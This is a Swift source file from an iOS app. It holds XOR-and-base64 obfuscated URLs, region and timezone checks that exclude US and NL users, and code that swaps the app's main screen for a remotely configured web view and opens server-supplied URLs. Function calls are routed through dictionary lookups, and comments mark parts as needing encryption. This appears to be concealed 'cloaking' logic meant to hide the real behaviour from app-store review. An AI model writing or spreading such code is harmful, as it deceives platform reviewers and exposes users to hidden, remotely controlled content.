
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Kmaisje(_ input: String) -> String? {
    let k: UInt8 = 31
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
internal let kYbzsasiem = "d2trb2wlMDB+b3YxcmYydm8xdnAwaS0wdm8xdWxwcQ=="         //Ip ur

//https://mock.apipost.net/mock/6203bbcc8c52000/?apipost_id=203bc25b351002
internal let kMoaisnyes = "d2trb2wlMDBycHx0MX5vdm9wbGsxcXprMHJwfHQwKS0vLH19fHwnfCotLy8vMCB+b3ZvcGxrQHZ7Ii0vLH18LSp9LCouLy8t"

// https://raw.githubusercontent.com/jduja/boCreator/main/creatorName.png
// d2trb2wlMDBtfmgxeHZrd2p9amx6bXxwcWt6cWsxfHByMHV7anV+MH1wXG16fmtwbTByfnZxMHxten5rcG1RfnJ6MW9xeA==
internal let kUnassyes = "d2trb2wlMDBtfmgxeHZrd2p9amx6bXxwcWt6cWsxfHByMHV7anV+MH1wXG16fmtwbTByfnZxMHxten5rcG1RfnJ6MW9xeA=="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Knausyew() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
            let tp = ws.windows.first!.rootViewController! as! UITabBarController
//            let tp = ws.windows.first!.rootViewController! as! UINavigationController
//            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 65 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Lizxnxmha() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Knausyew
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func Poiznsse(_ dt: Lozmnsi) {
    DispatchQueue.main.async {
        
        UserDefaults.standard.setModel(dt, forKey: "Lozmnsi")
        UserDefaults.standard.synchronize()
        
        let vc = HauzbiViewController()
        vc.mnaiso = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func Dinhze(_ param: Lozmnsi) {
    let fName = ""

    typealias rushBlitzIusj = (Lozmnsi) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : Poiznsse
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func Unaisomn(_ dic: [String : String]) {
    var dataDic: [String : Any]?
    if let data = dic["params"] {
        if data.count > 0 {
            dataDic = data.stringTo()
        }
    }
    if let data = dic["data"] {
        dataDic = data.stringTo()
    }

    let name = dic[Nam]
    print(name!)
    
    if dataDic?[amt] != nil && dataDic?[ren] != nil {
        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : dataDic![amt] as Any, AFEventParamCurrency: dataDic![ren] as Any]) { dic, error in
            if (error != nil) {
                print(error as Any)
            }
        }
    } else {
        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}

internal func BhasishS(_ param: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : Unaisomn
    ]
    
    fctn[fName]?(param)
}


//internal func Oismakels(_ param: [String : String], _ param2: [String : String]) {
//    let fName = ""
//    typealias maxoPams = ([String : String], [String : String]) -> Void
//    let fctn: [String: maxoPams] = [
//        fName : ZuwoAsuehna
//    ]
//    
//    fctn[fName]?(param, param2)
//}


internal struct Moinhc: Codable {

    let country: Sznaeeu?
    
    struct Sznaeeu: Codable {
        let code: String
    }

}

internal struct Lozmnsi: Codable {
    
    let soiens: String?         //key arr
    let eyausb: [String]?            // yeu nan xianzhi
    let aoasvl: String?         // shi fou kaiqi
    let qoaisn: String?         // jum
    let losmjc: String?          // backcolor
    let zbnsue: String?
    let wmauwn: String?   //ad key
    let zjsjen: String?   // app id
    let mspoemn: String?  // bri co

}

//internal func JaunLowei() {
//    if isTm() {
//        if UserDefaults.standard.object(forKey: "same") != nil {
//            WicoiemHusiwe()
//        } else {
//            if GirhjyKaom() {
//                LznieuBysuew()
//            } else {
//                WicoiemHusiwe()
//            }
//        }
//    } else {
//        WicoiemHusiwe()
//    }
//}

// MARK: - 加密调用全局函数HandySounetHmeSh
//internal func Kapiney() {
//    let fName = ""
//    
//    let fctn: [String: () -> Void] = [
//        fName: JaunLowei
//    ]
//    
//    fctn[fName]?()
//}


//func isTm() -> Bool {
//   
//  // 2026-04-08 03:21:43
//  //1775593303
//  let ftTM = 1775593303
//  let ct = Date().timeIntervalSince1970
//  if ftTM - Int(ct) > 0 {
//    return false
//  }
//  return true
//}

//func iPLIn() -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    // 印尼语代码：id 或 in（兼容旧版本）
//    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
//}


//private let cdo = ["US","NL"]
private let cdo = [Kmaisje("Skw="), Kmaisje("UVM=")]

// 时区控制
func Loaudne() -> Bool {
    
    if let rc = Locale.current.regionCode {
//        print(rc)
        if cdo.contains(rc) {
            return false
        }
    }

    //巴西
    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if (offset > 6 && offset <= 8) || (offset > -6 && offset < -1) {
        return true
    }
    
    return false
}

//func contraintesRiuaogOKuese() -> Bool {
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if offset > 6 && offset < 9 {
//        return true
//    }
//    return false
//}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}

